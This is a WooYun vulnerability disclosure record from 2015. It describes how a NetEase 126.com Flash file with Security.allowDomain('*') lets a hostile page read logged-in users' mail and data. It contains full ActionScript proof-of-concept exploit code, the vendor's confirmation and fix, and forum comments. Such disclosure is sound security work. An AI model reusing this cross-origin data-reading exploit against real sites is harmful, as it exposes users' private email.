{"id": 37048, "wybug_id": "wooyun-2015-0106908", "wybug_title": "我是如何读取已登陆用户163/126 邮件的", "wybug_corp": "网易", "wybug_author": "EtherDream", "wybug_date": "2015-04-09 20:08", "wybug_open_date": "2015-05-25 17:22", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-25：\t细节向公众公开  简要描述： 利用 126.com 下一个 flash，可随意读取网易大部分站点的数据。 详细说明：  存在漏洞的 flash 文件：http://mail.126.com/js6/h/flashRequest.swf开启了致命的 Security.allowDomain(\"*\") 不知咋搞的，明明看见初始化代码里有各种授权判断，但最终还是调用了这个方法。非常无语。。。有了这个一切都好办。 搜索网络 API，发现 FlashRequest 类使用了 URLStream，而且这个类关键方法都是 public，那就非常明朗了。用自己的  flash 加载这个 swf，反射出 FlashRequest，照着他的格式调用就行。。。   漏洞证明：  Demo: http://www.etherdream.com/hack/netease-mail/flatest.html（显示在控制台）\npackage {\timport flash.display.Loader;\timport flash.display.Sprite;\timport flash.events.Event;\timport flash.external.ExternalInterface;\timport flash.net.URLLoader;\timport flash.net.URLRequest;\timport flash.system.Security;\timport flash.utils.getDefinitionByName;\t\t\tpublic class flahack extends Sprite {\t\tprivate static const PATH:String =\t\t\t'com.netease.mail.FlashRequest';\t\tprivate static const URL:String =\t\t\t'http://mail.126.com/js6/h/flashRequest.swf?callback=hello';\t\tprivate var loader:Loader = new Loader();\t\tprivate var cls:*;\t\t\t\tpublic function flahack() {\t\t\tSecurity.allowDomain('*');\t\t\tloader.contentLoaderInfo.addEventListener(Event.COMPLETE, onReady);\t\t\tloader.load(new URLRequest(URL));\t\t}\t\t\t\tprivate function onReady(e:Event) : void {\t\t\t//stage.addChild(loader);\t\t\tcls = loader.contentLoaderInfo.applicationDomain.getDefinition(PATH);\t\t\tExternalInterface.addCallback('Load', extern_load);\t\t\tExternalInterface.call('__fla_ready');\t\t}\t\tprivate function extern_load(url: String) : void {\t\t\tvar obj:* = new cls(function(...args) : void {\t\t\t\tif (args[0] != 'complete') return;\t\t\t\tvar data:String = args[2];\t\t\t\tExternalInterface.call('__fla_complete',\t\t\t\t\turl,\t\t\t\t\tdata.replace(/\\\\/g, '\\\\\\\\')\t\t\t\t);\t\t\t\t\t\t});\t\t\tobj.open('GET', url, 'utf-8');\t\t\tobj.send('');\t\t}\t}}\n   修复方案：  输出敏感信息的站点部署 crossdomain.xml 风险很大，设计不合理。对了，还看到 flash 里使用 ExternalInterface.call(\"location.host.toString\") 来获得页面地址，尽管这次没利用，但也是有 bug 的。ExternalInterface.call 的结果可以被页面 js 重写的，可以返回任意结果。   版权声明：转载请注明来源 EtherDream@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-10 17:20 厂商回复： 感谢您对网易的关注！此漏洞已修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-09 20:19 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  怎么标题变了~    \n     2015-04-10 00:13 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  这个关注一下。    \n     2015-04-10 18:02 |    \t\tsherlock \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 这个人很懒 标点符号都没留下)\t\t \n  flash...    \n     2015-04-12 11:36 |    \t\twangbing86 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 慢慢学习路)\t\t \n  好牛逼的样子    \n     2015-05-04 17:34 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}